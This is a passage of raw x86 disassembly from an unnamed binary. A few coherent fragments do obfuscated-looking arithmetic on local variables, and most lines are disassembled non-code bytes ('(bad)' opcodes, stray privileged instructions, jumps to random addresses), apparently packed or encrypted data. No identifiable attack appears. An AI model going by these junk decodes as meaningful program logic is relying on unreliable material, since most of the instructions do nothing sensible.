  41492a:	mov    ebp,0x1a2731ef
  41492f:	jp     0x4148c9
  414931:	nop
  414932:	aam    0xe2
  414934:	adc    ebx,DWORD PTR [edx]
  414936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414937:	mov    al,0x8f
  414939:	push   cs
  41493a:	test   al,0xda
  41493c:	jnp    0x4148bf
  41493e:	pop    ebp
  41493f:	mov    edx,0x8702c582
  414944:	(bad)  
  414946:	cmp    dh,dl
  414948:	mov    ecx,DWORD PTR [ebp-0x4]
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0xffffff88
  414996:	sahf   
  414997:	mov    ch,0x7c
  414999:	mov    ebx,DWORD PTR [eax+ebx*1]
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    bh,bh
  4149a2:	inc    edi
  4149a3:	and    al,0x1d
  4149a6:	sub    eax,0x94a950d0
  4149ab:	lods   al,BYTE PTR ds:[esi]
  4149ac:	iret   
  4149ad:	sbb    bh,BYTE PTR [eax]
  4149af:	retf   0x1316
  4149b2:	int    0xc1
  4149b4:	xchg   DWORD PTR [esi+0x1534e435],esp
  4149ba:	stc    
  4149bb:	xchg   esi,eax
  4149bc:	enter  0xa308,0x19
  4149c0:	fidiv  DWORD PTR [edi+ecx*8-0x67]
  4149c4:	jnp    0x4149e5
  4149c6:	je     0x4149ae
  4149c8:	std    
  4149c9:	sbb    BYTE PTR [ebx],cl
  4149cb:	repnz add al,BYTE PTR [esi]
  4149ce:	inc    esp
  4149cf:	dec    esp
  4149d0:	les    ebx,FWORD PTR [ebp-0x29]
  4149d3:	popf   
  4149d4:	into   
  4149d5:	(bad)  
  4149d6:	stos   DWORD PTR es:[edi],eax
  4149d7:	pop    esi
  4149d8:	cmp    BYTE PTR [eax-0x5e6dbd59],0x11
  4149df:	push   ds
  4149e0:	(bad)  
  4149e1:	sahf   
  4149e2:	inc    esp
  4149e3:	data16 (bad) 
  4149e5:	xlat   BYTE PTR ds:[ebx]
  4149e6:	js     0x414a19
  4149e8:	retf   0xa35
  4149eb:	fbld   TBYTE PTR [edi+0x578ac0d6]
  4149f1:	into   
  4149f2:	stc    
  4149f3:	push   ss
  4149f4:	sub    edx,eax
  4149f6:	loope  0x414a54
  4149f8:	jbe    0x414a47
  4149fa:	and    BYTE PTR [ecx],dh
  4149fc:	push   esi
  4149fd:	mov    DWORD PTR [eax+0x71],esi
  414a00:	(bad)  
  414a01:	hlt    
  414a02:	sub    eax,0x6079e02c
  414a07:	dec    ecx
  414a08:	dec    ecx
  414a09:	xchg   ebp,eax
  414a0a:	inc    ebx
  414a0b:	push   ss
  414a0c:	cld    
  414a0d:	adc    ecx,DWORD PTR [ebp+eiz*1-0x10]
  414a11:	or     DWORD PTR [edi-0x274d77a3],edx
  414a17:	pop    eax
  414a18:	jae    0x414a60
  414a1a:	add    al,0x19
  414a1c:	mov    BYTE PTR [edx-0x57971975],al
  414a22:	and    BYTE PTR [ebx-0x56],dl
  414a25:	test   eax,0xc1fc64e8
  414a2a:	xchg   esp,eax
  414a2b:	push   eax
  414a2c:	(bad)  
  414a2d:	pop    esp
  414a2e:	adc    eax,0x316bfed2
  414a33:	jo     0x414a96
  414a35:	mov    ch,0x72
  414a37:	cmp    eax,0x879d9281
  414a3c:	ja     0x4149f6
  414a3e:	xlat   BYTE PTR ds:[ebx]
  414a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a40:	in     eax,dx
  414a41:	mov    cl,0x6f
  414a43:	js     0x414a69
  414a45:	rol    DWORD PTR [ecx],0x89
  414a48:	mov    edx,DWORD PTR [ebx-0x3d8c233a]
  414a4e:	ds pop eax
  414a50:	fwait
  414a51:	mov    esi,0xcbd78471
  414a56:	ror    BYTE PTR [edx+eiz*1-0x2e9cd586],0xfb
  414a5e:	fdiv   st(0),st
  414a60:	les    ebp,FWORD PTR [ecx-0x41641501]
  414a66:	aaa    
  414a67:	int3   
  414a68:	cdq    
  414a69:	sbb    ah,BYTE PTR [ebx]
  414a6b:	or     eax,0xc2ea38e0
  414a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a71:	inc    esp
  414a72:	xor    eax,ebp
  414a74:	inc    edi
  414a75:	adc    DWORD PTR [edi],eax
  414a77:	mov    dh,dh
  414a79:	cli    
  414a7a:	fmul   DWORD PTR [esi]
  414a7c:	cmp    esp,DWORD PTR [edx]
  414a7e:	push   ebx
  414a7f:	gs (bad) 
  414a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a82:	fs mov dl,0x89
  414a85:	mov    esi,0x75af23fb
  414a8a:	push   ss
  414a8b:	fwait
  414a8c:	xchg   DWORD PTR [ebp+ebp*1+0x5c],edx
  414a90:	sub    bl,BYTE PTR [esi]
  414a92:	push   0x9302e1f9
  414a97:	jmp    0xbbf67380
  414a9c:	and    ebx,eax
  414a9e:	add    esp,esi
  414aa0:	gs mov dl,0x1e
  414aa3:	call   0xc20a3065
  414aa8:	inc    ebx
  414aa9:	mov    esi,0x7c062809
  414aae:	sub    eax,0x29239ca3
  414ab3:	sub    al,0xf5
  414ab5:	push   0x39
  414ab7:	popf   
  414ab8:	mul    eax
  414aba:	mov    ecx,0xc47bddf6
  414abf:	fwait
  414ac0:	(bad)  
  414ac1:	jns    0x414a58
  414ac3:	dec    ebx
  414ac4:	jmp    FWORD PTR [eax+ecx*8+0x22299d40]
  414acb:	xchg   ecx,eax
  414acc:	stos   DWORD PTR es:[edi],eax
  414acd:	(bad)
  414ad0:	and    al,0x56
  414ad2:	ret    
  414ad3:	lahf   
  414ad4:	dec    ecx
  414ad5:	dec    esi
  414ad6:	shl    BYTE PTR [edx-0x3c],cl
  414ad9:	bound  ebp,QWORD PTR [esi-0x50]
  414adc:	push   ebx
  414add:	inc    eax
  414ade:	test   al,0xba
  414ae0:	jecxz  0x414b5e
  414ae2:	xor    eax,0x1aa60ed6
  414ae7:	in     al,0x6b
  414ae9:	jno    0x414a98
  414aeb:	or     eax,0x3a8b382a
  414af0:	xor    eax,0xd1df998f
  414af5:	jl     0x414b54
  414af7:	mov    ds:0xc7294884,eax
  414afc:	mov    al,0x32
  414afe:	sbb    eax,0x3e66e542
  414b03:	jae    0x414ad6
  414b05:	xor    BYTE PTR [esi-0x3f40f4f6],dh
  414b0b:	cmp    eax,0x1251686c
  414b10:	add    BYTE PTR [eax+ebx*4-0x3e],dh
  414b14:	sub    ah,0x96
  414b17:	imul   eax,DWORD PTR [ecx-0x65],0xffffffe5
  414b1b:	mov    esi,0x3b481e55
  414b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b21:	pop    ebx
  414b22:	jae    0x414b18
  414b24:	in     eax,dx
  414b25:	leave  
  414b26:	call   0xe440b721
  414b2b:	stc    
  414b2c:	loopne 0x414af0
  414b2e:	imul   ecx
  414b30:	scas   eax,DWORD PTR es:[edi]
  414b31:	fucomip st,st(5)
  414b33:	mov    eax,esi
  414b35:	test   al,0x42
  414b37:	adc    ch,al
  414b39:	jmp    0x2afad566
  414b3e:	dec    esi
  414b3f:	imul   DWORD PTR [ebp+0x33b6857d]
  414b45:	pop    edi
  414b46:	stos   DWORD PTR es:[edi],eax
  414b47:	(bad)  
  414b48:	leave  
  414b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b4a:	cld    
  414b4b:	xchg   DWORD PTR es:[ebx-0x36],esp
  414b4f:	pmulhw mm4,QWORD PTR [edx+0x50716a32]
  414b56:	dec    ecx
  414b57:	push   es
  414b58:	aas    
  414b59:	add    edx,esp
  414b5b:	inc    esi
  414b5c:	retf   
  414b5d:	inc    esp
  414b5e:	push   esi
  414b5f:	les    esp,FWORD PTR [ebx]
  414b61:	pop    ebx
  414b62:	pop    es
  414b63:	sbb    DWORD PTR [ebp-0x69],edi
  414b66:	(bad)  
  414b67:	sub    esi,DWORD PTR [edi+eiz*2+0x5d]
  414b6b:	cld    
  414b6c:	jbe    0x414bd3
  414b6e:	xchg   ebx,eax
  414b6f:	stos   DWORD PTR es:[edi],eax
  414b70:	cmc    
  414b71:	adc    al,0x15
  414b73:	jmp    0xa3c2e0b0
  414b78:	loopne 0x414bd1
  414b7a:	out    dx,eax
  414b7b:	jp     0x414bde
  414b7d:	imul   esi,DWORD PTR [ecx],0xbd7ddc34
  414b83:	fsub   st,st(1)
  414b85:	aad    0x97
  414b87:	jg     0x414b59
  414b89:	call   0xca6b9282
  414b8e:	jbe    0x414be8
  414b90:	mov    eax,ds:0xb2542f72
  414b95:	push   edx
  414b96:	push   es
  414b97:	loop   0x414bfd
  414b99:	jl     0x414b72
  414b9b:	stc    
  414b9c:	enterw 0xcb,0xe0
  414ba1:	mov    cl,0xd2
  414ba3:	out    0xff,eax
  414ba5:	push   cs
  414ba6:	sub    BYTE PTR [edi-0x1a],0x3a
  414baa:	and    esi,DWORD PTR [edi+0x646049eb]
  414bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb1:	jmp    0x95ce:0x4f6bbf42
  414bb8:	jg     0x414c2c
  414bba:	push   esi
  414bbb:	xchg   edx,eax
  414bbc:	sbb    DWORD PTR [ebp-0x368d3555],ecx
  414bc2:	not    DWORD PTR [ebx+0x58716aec]
  414bc8:	gs sbb eax,0x17b2b79c
  414bce:	popf   
  414bcf:	push   esp
  414bd0:	cmp    DWORD PTR [esi],0xd95ec20
  414bd6:	dec    ebx
  414bd7:	lods   eax,DWORD PTR ds:[esi]
  414bd8:	in     eax,dx
  414bd9:	icebp  
  414bda:	into   
  414bdb:	outs   dx,BYTE PTR ds:[esi]
  414bdc:	cmp    DWORD PTR [edi],ebx
  414bde:	adc    DWORD PTR [edi-0x5],ebp
  414be1:	push   0x17959b3
  414be6:	adc    al,0x40
  414be8:	arpl   WORD PTR [esi-0x7cd2eafe],cx
  414bee:	push   es
  414bef:	and    edi,DWORD PTR [edi-0x6a]
  414bf2:	loopne 0x414bfd
  414bf4:	nop
  414bf5:	lds    ebp,FWORD PTR [eax]
  414bf7:	mov    ecx,0x8e401737
  414bfc:	jp     0x414c73
  414bfe:	push   esp
  414bff:	dec    ebp
  414c00:	retf   
  414c01:	loope  0x414bf8
  414c03:	mov    ebp,0x15dfd338
  414c08:	das    
  414c09:	jns    0x414b9f
  414c0b:	fcomp  DWORD PTR [edi]
  414c0d:	dec    esi
  414c0e:	adc    eax,DWORD PTR [edi+ecx*2+0x699bb6af]
  414c15:	mov    DWORD PTR [ebx],eax
  414c17:	rol    DWORD PTR [edi+edx*2-0x9],0x6a
  414c1c:	xor    dh,BYTE PTR [ecx-0x4a]
  414c1f:	loopne 0x414c5a
  414c21:	fwait
  414c22:	inc    ebx
  414c23:	mov    BYTE PTR [esp+edi*1-0x2],dl
  414c27:	jp     0x414c01
  414c29:	aas    
  414c2a:	cld    
  414c2b:	or     eax,DWORD PTR [esi+0x54]
  414c2e:	cmp    al,0x45
  414c30:	xchg   edx,eax
  414c31:	sbb    ch,BYTE PTR [eax+edi*8]
  414c34:	fxch   st(5)
  414c36:	sar    BYTE PTR [edx-0x72852d1f],cl
  414c3c:	sbb    eax,0x3f1756cd
  414c41:	and    edi,0x79
  414c44:	add    edi,edi
  414c46:	ja     0x414cbf
  414c48:	mov    eax,ds:0x98b18777
  414c4d:	fisub  WORD PTR [edx+edi*8+0x15ca70e]
  414c54:	(bad)  
  414c55:	or     al,0x8c
  414c57:	dec    edx
  414c58:	std    
  414c59:	call   0xb5b5d840
  414c5e:	test   al,0xdd
  414c60:	cld    
  414c61:	arpl   WORD PTR [edi-0x24],sp
  414c64:	pop    esi
  414c65:	pusha  
  414c66:	or     BYTE PTR ds:[edx-0x4c],cl
  414c6a:	mov    eax,DWORD PTR [edi]
  414c6c:	lds    esi,FWORD PTR [ecx]
  414c6e:	jmpw   0x9891
  414c72:	jb     0x414cef
  414c74:	xchg   edi,eax
  414c75:	mov    ds:0x9c50ebbe,al
  414c7a:	mov    bh,0xbc
  414c7c:	enter  0xf535,0x4b
  414c80:	aas    
  414c81:	cld    
  414c82:	jne    0x414c78
  414c84:	mov    esp,ebp
  414c86:	push   ds
  414c87:	ds lahf 
  414c89:	sub    DWORD PTR [edi-0x7a],esi
  414c8c:	fsub   st(7),st
  414c8e:	xchg   edx,eax
  414c8f:	xor    esi,DWORD PTR [eax+0x31]
  414c92:	adc    ch,BYTE PTR [esi+0x3104ebd5]
  414c98:	mov    edi,0x98ecceb9
  414c9d:	inc    ebp
  414c9e:	dec    edi
  414c9f:	js     0x414cae
  414ca1:	pop    es
  414ca2:	add    eax,0x4c0ef5ae
  414ca7:	jle    0x414c36
  414ca9:	jecxz  0x414d18
  414cab:	popf   
  414cac:	mov    ebp,0xd40be5f1
  414cb1:	or     BYTE PTR [esi],bh
  414cb3:	dec    esi
  414cb4:	dec    esp
  414cb5:	idiv   ecx
  414cb7:	push   eax
  414cb8:	and    ecx,DWORD PTR [edi-0x6d]
  414cbb:	(bad)  
  414cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cbd:	push   ebx
  414cbe:	imul   BYTE PTR [edx+0x35]
  414cc1:	test   DWORD PTR [esi+ecx*4+0x147c8916],ebx
  414cc8:	out    0x19,al
  414cca:	adc    BYTE PTR [ebx-0x130d0602],ah
  414cd0:	add    eax,0xba090b40
  414cd5:	mov    esi,0x61d37bd
  414cda:	test   BYTE PTR [eax],dh
  414cdc:	cs in  eax,0x5f
  414cdf:	jbe    0x414ced
  414ce1:	or     al,0x7b
  414ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ce4:	mov    bl,0x22
  414ce6:	(bad)  
  414ce7:	hlt    
  414ce8:	sub    DWORD PTR [ebx-0x2f],eax
  414ceb:	in     eax,dx
  414cec:	sbb    al,0xb5
  414cee:	jb     0x414c9f
  414cf0:	mov    al,ds:0x6e46b0aa
  414cf5:	lods   eax,DWORD PTR ds:[esi]
  414cf6:	and    BYTE PTR [eax],al
  414cf8:	fstp   QWORD PTR [ebx-0x5eeb0c47]
  414cfe:	test   eax,0x17b6ed03
  414d03:	inc    edi
  414d04:	loope  0x414d80
  414d06:	nop
  414d07:	jmp    0xc46b094c
  414d0c:	das    
  414d0d:	fadd   DWORD PTR [bp+si-0x26f9]
  414d12:	or     BYTE PTR [ebx+0x643a19e6],dl
  414d18:	shl    BYTE PTR [eax+ebp*8-0x32d6129e],0x18
  414d20:	mov    al,ds:0xe820a811
  414d25:	in     al,0xe3
  414d27:	sahf   
  414d28:	and    eax,ebp
  414d2a:	imul   ecx,DWORD PTR [ebx-0x49],0xffffffe9
  414d2e:	(bad)  
  414d2f:	dec    esp
  414d30:	cs lock jne 0x414d4d
  414d34:	jnp    0x414d30
  414d36:	add    ecx,ebx
  414d38:	test   al,0x8
  414d3a:	add    edx,DWORD PTR [eax+eax*8+0x9]
  414d3e:	add    DWORD PTR [edx+0x62],0x1b63636e
  414d45:	push   cs
  414d46:	sub    eax,0xc1031d34
  414d4b:	mov    ecx,DWORD PTR [ebp+0x8]
  414d4e:	add    ecx,eax
  414d50:	mov    DWORD PTR [ebp+0x8],ecx
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0xe3
  414e02:	add    bh,al
  414e04:	push   0x42
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx-0x69e7e7ee],dl
  414e0e:	mov    ah,0x8d
  414e10:	sub    BYTE PTR [edx-0x5993f0d6],bl
  414e16:	adc    ebp,ebx
  414e18:	aam    0xaf
  414e1a:	or     DWORD PTR [esi-0x2],ebx
  414e1d:	and    eax,DWORD PTR [edx+eax*2]
  414e20:	wbinvd 
  414e22:	stos   DWORD PTR es:[edi],eax
  414e23:	mov    esp,0xb81ddf97
  414e28:	pop    ecx
  414e29:	jno    0x414e4f
  414e2b:	mov    DWORD PTR [edi+edi*2],ecx
  414e2e:	push   ebx
  414e2f:	(bad)
  414e32:	stc    
  414e33:	test   al,0x73
  414e35:	aaa    
  414e36:	mov    ds:0x64c834b5,al
  414e3b:	addr16 mov al,0x77
  414e3e:	inc    eax
  414e3f:	xchg   edi,eax
  414e40:	dec    esi
  414e41:	mov    ah,0x2f
  414e43:	test   DWORD PTR [ebx-0x5f5f1848],esp
  414e49:	or     ah,BYTE PTR [eax+edx*1-0x54]
  414e4d:	cmp    eax,DWORD PTR [ebp+0xaeff3e8]
  414e53:	xchg   edi,eax
  414e54:	popa   
  414e55:	pop    esp
  414e56:	mov    ebp,0x734115f5
  414e5b:	stc    
  414e5c:	xchg   edi,eax
  414e5d:	add    esi,DWORD PTR [ecx]
  414e5f:	(bad)  
  414e60:	lds    ebp,FWORD PTR [edx]
  414e62:	into   
  414e63:	mov    edx,0xa9e322ac
  414e68:	or     edx,DWORD PTR [ebx+0x6bf942c0]
  414e6e:	es xchg si,ax
  414e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e72:	nop
  414e73:	push   DWORD PTR [ebx+0x54]
  414e76:	mov    edx,0x6810d179
  414e7b:	js     0x414e28
  414e7d:	fdivrp st(3),st
  414e7f:	cli    
  414e80:	cmc    
  414e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e82:	(bad)  
  414e83:	imul   esi,DWORD PTR [ecx-0x11db314f],0xffffffd6
  414e8a:	mov    esi,0x92f64842
  414e8f:	pop    ebx
  414e90:	stos   DWORD PTR es:[edi],eax
  414e91:	(bad)  
  414e92:	push   esp
  414e93:	and    DWORD PTR [ebp+0x10],esp
  414e96:	sbb    cl,cl
  414e98:	push   edx
  414e99:	sub    al,0x6e
  414e9b:	mov    ebp,0xae0b0795
  414ea0:	mov    dh,0xa1
  414ea2:	jge    0x414eed
  414ea4:	and    ebp,DWORD PTR [esi]
  414ea6:	in     eax,0x40
  414ea8:	(bad)  [edx-0x3ff98676]
  414eae:	jmp    0xaa79:0x152b025a
  414eb5:	fucomip st,st(4)
  414eb7:	sub    BYTE PTR [esi+0x2f2d5bac],bh
  414ebd:	xchg   ecx,eax
  414ebe:	xchg   esi,eax
  414ebf:	mov    ebx,0xa9aa2d42
  414ec4:	mov    ebx,0x5074fcd9
  414ec9:	mov    WORD PTR ds:0xccf701be,fs
  414ecf:	leave  
  414ed0:	sub    ebx,DWORD PTR [ebx-0x29]
  414ed3:	fistp  WORD PTR [ecx]
  414ed5:	pop    edx
  414ed6:	or     al,0xcf
  414ed8:	adc    DWORD PTR [ebp-0x59],ecx
  414edb:	adc    dh,BYTE PTR ds:0x8388f8e0
  414ee1:	inc    esi
  414ee2:	jnp    0x414f46
  414ee4:	push   ds
  414ee5:	cmp    DWORD PTR [ecx-0xb],esi
  414ee8:	fisubr WORD PTR [edx-0x7]
  414eeb:	add    DWORD PTR [edx],esi
  414eed:	add    cl,BYTE PTR [ecx]
  414eef:	add    eax,DWORD PTR [ecx-0x1d]
  414ef2:	inc    esp
  414ef3:	ja     0x414f28
  414ef5:	(bad)  
  414ef6:	jbe    0x414eed
  414ef8:	mov    esp,0x6f0a1bdb
  414efd:	inc    esp
  414efe:	dec    edx
  414eff:	mov    ebp,0x6aeed460
  414f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f05:	cli    
  414f06:	sub    ah,BYTE PTR [ebx-0x2]
  414f09:	pop    ds
  414f0a:	push   ss
  414f0b:	jg     0x414f39
  414f0d:	addr16 jge 0x414f15
  414f10:	lods   eax,DWORD PTR ds:[esi]
  414f11:	jg     0x414f8b
  414f13:	sbb    eax,0xbdef4afc
  414f18:	les    edi,FWORD PTR [esi]
  414f1a:	add    BYTE PTR fs:[ecx+0x36c26f09],bl
  414f21:	int    0x4b
  414f23:	inc    edi
  414f24:	mov    ebp,0x81a79611
  414f29:	sbb    eax,0x9cbe9c40
  414f2e:	jg     0x414eb3
  414f30:	or     eax,edx
  414f32:	ror    DWORD PTR [eax+0x71649716],0x76
  414f39:	sub    dl,BYTE PTR [ebp+0x9]
  414f3c:	jge    0x414ebe
  414f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f3f:	mov    ds:0xfc1fccd2,al
  414f44:	addr16 aaa 
  414f46:	pop    ebx
  414f47:	and    BYTE PTR [edi],bh
  414f49:	and    DWORD PTR [edi+0xf],ebp
  414f4c:	dec    esp
  414f4d:	push   esp
  414f4e:	push   ds
  414f4f:	aad    0x68
  414f51:	cmc    
  414f52:	fisttp DWORD PTR [edi-0xc]
  414f55:	jecxz  0x414ef0
  414f57:	xor    esi,ebx
  414f59:	scas   eax,DWORD PTR es:[edi]
  414f5a:	push   ds
  414f5b:	popf   
  414f5c:	jl     0x414f9f
  414f5e:	jns    0x414f08
  414f60:	push   eax
  414f61:	jmp    0x414f30
  414f63:	(bad)  
  414f64:	into   
  414f65:	sbb    esp,DWORD PTR [esi-0x251f4627]
  414f6b:	adc    BYTE PTR [eax-0x5aaa2463],0x38
  414f72:	adc    BYTE PTR [ebx-0x47d3eedb],0x51
  414f79:	sub    DWORD PTR [edi+0x527d5dca],eax
  414f7f:	push   ecx
  414f80:	int    0x3e
  414f82:	or     esp,DWORD PTR [edi+0x679c76dc]
  414f88:	xchg   DWORD PTR [eax],eax
  414f8a:	sub    bl,dl
  414f8c:	xlat   BYTE PTR ds:[ebx]
  414f8d:	jmp    FWORD PTR [ebx]
  414f8f:	add    al,0xe
  414f91:	xor    BYTE PTR ss:[edi+0x7b73cc01],al
  414f98:	sub    eax,0x534698b8
  414f9d:	and    edx,ebx
  414f9f:	xchg   ebx,eax
  414fa0:	fs es (bad) 
  414fa3:	fadd   QWORD PTR [ecx]
  414fa5:	popa   
  414fa6:	mov    eax,ds:0x31cf29b7
  414fab:	repnz fdivr st(1),st
  414fae:	sahf   
  414faf:	sbb    ch,BYTE PTR gs:[ebx-0x60]
  414fb3:	aaa    
  414fb4:	xchg   ecx,eax
  414fb5:	fdivr  st(1),st
  414fb7:	push   es
  414fb8:	mov    eax,0x4bdbcb7
  414fbd:	and    ch,dl
  414fbf:	outs   dx,DWORD PTR ds:[esi]
  414fc0:	loop   0x415019
  414fc2:	xchg   esp,eax
  414fc3:	xchg   esi,eax
  414fc4:	cli    
  414fc5:	cs mov dh,0xbe
  414fc8:	cmc    
  414fc9:	fs pop edi
  414fcb:	data16 mov WORD PTR [ecx],cs
  414fce:	int3   
  414fcf:	push   ebp
  414fd0:	es je  0x414f92
  414fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fd4:	addr16 aaa 
  414fd6:	mov    esi,0xe4b7245f
  414fdb:	adc    al,al
  414fdd:	cmp    cl,BYTE PTR gs:[ebx+0x7a]
  414fe1:	mov    cl,0xa3
  414fe3:	imul   edi,esp,0xa5d09fd0
  414fe9:	add    al,0xf
  414feb:	imul   DWORD PTR [ecx+0x71]
  414fee:	daa    
  414fef:	aad    0xcf
  414ff1:	addr16 cli 
  414ff3:	fistp  DWORD PTR [edi+0x249b9e77]
  414ff9:	jmp    0x5de0:0x9a957957
  415000:	inc    BYTE PTR [edi+0x13cec240]
  415006:	pop    esi
  415007:	gs and al,0x8f
  41500a:	push   eax
  41500b:	mov    ch,0x21
  41500d:	cmp    DWORD PTR [edi+ebx*2+0x11],ecx
  415011:	inc    ebx
  415012:	aad    0xdf
  415014:	mov    bl,BYTE PTR [edi]
  415016:	stos   DWORD PTR es:[edi],eax
  415017:	cdq    
  415018:	sub    esi,DWORD PTR [esi-0x18]
  41501b:	cmp    BYTE PTR [edx],dh
  41501d:	cmp    ebp,DWORD PTR [ecx]
  41501f:	mov    WORD PTR [ebp-0x16],cs
  415022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415023:	push   es
  415024:	push   esp
  415025:	neg    DWORD PTR [esp+edx*4]
  415028:	add    eax,DWORD PTR [edi+0x7d64ee94]
  41502e:	pusha  
  41502f:	cmp    eax,ecx
  415031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415032:	jl     0x414fce
  415034:	xchg   DWORD PTR [ebx+edx*4-0x482b6e82],ecx
  41503b:	scas   eax,DWORD PTR es:[edi]
  41503c:	aam    0x5b
  41503e:	cwde   
  41503f:	daa    
  415040:	and    eax,0xd58d7059
  415045:	(bad)  
  415046:	sar    DWORD PTR [edi],1
  415048:	add    esp,DWORD PTR [esi-0x42ea3d06]
  41504e:	pop    esp
  41504f:	lahf   
  415050:	add    edi,DWORD PTR [edi]
  415052:	fiadd  DWORD PTR [ebx-0x6e8b93f2]
  415058:	cld    
  415059:	in     al,dx
  41505a:	add    al,0x7
  41505c:	sti    
  41505d:	jg     0x4150c2
  41505f:	out    0x3a,al
  415061:	push   DWORD PTR [ecx+0x6e]
  415064:	lods   eax,DWORD PTR ds:[esi]
  415065:	pop    edx
  415066:	imul   esi,edi,0x334002ff
  41506c:	nop
  41506d:	shr    cl,1
  41506f:	add    eax,0xc02f4fb7
  415074:	in     al,dx
  415075:	fidiv  DWORD PTR [eax-0x61]
  415078:	sub    BYTE PTR [esi+edx*4],bh
  41507b:	mov    ds:0x1669fb62,al
  415080:	push   ebp
  415081:	mov    ebx,eax
  415083:	lahf   
  415084:	dec    ebx
  415085:	cmp    dh,BYTE PTR [eax]
  415087:	or     BYTE PTR [ebp-0x63],ch
  41508a:	mov    cl,0xcb
  41508c:	fdiv   QWORD PTR [ecx+0x6c]
  41508f:	xchg   ebx,eax
  415090:	inc    edi
  415091:	fcmovb st,st(6)
  415093:	lock xor bl,BYTE PTR [ebp+0x109cb337]
  41509a:	mov    edx,0xc94feafe
  41509f:	enter  0xa624,0x4b
  4150a3:	mov    ds,WORD PTR [ebx+0x58e28653]
  4150a9:	out    0x49,al
  4150ab:	lahf   
  4150ac:	mov    ds:0x1c5e552a,al
  4150b1:	repnz arpl bp,sp
  4150b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150b5:	mov    dl,0xf
  4150b7:	xchg   esi,eax
  4150b9:	mov    bl,0x5c
  4150bb:	(bad)  
  4150bc:	cli    
  4150bd:	imul   edx,DWORD PTR [edx-0x79],0x6ed08582
  4150c4:	call   0x49bbdec3
  4150c9:	ins    DWORD PTR es:[edi],dx
  4150ca:	add    eax,0x8ded9b87
  4150cf:	gs cmp al,0xfd
  4150d2:	jnp    0x41511c
  4150d4:	call   0x746f5afe
  4150d9:	mov    ds:0xce8daa06,al
  4150de:	cli    
  4150df:	sti    
  4150e0:	cs iret 
  4150e2:	scas   eax,DWORD PTR es:[edi]
  4150e3:	scas   eax,DWORD PTR es:[edi]
  4150e4:	stc    
  4150e5:	hlt    
  4150e6:	and    ebx,DWORD PTR [edx]
  4150e8:	ret    0x81b7
  4150eb:	sbb    al,0x73
  4150ed:	rcr    dl,cl
  4150ef:	(bad)  
  4150f1:	pop    ss
  4150f2:	cli    
  4150f3:	push   eax
  4150f4:	sbb    cl,BYTE PTR [edx]
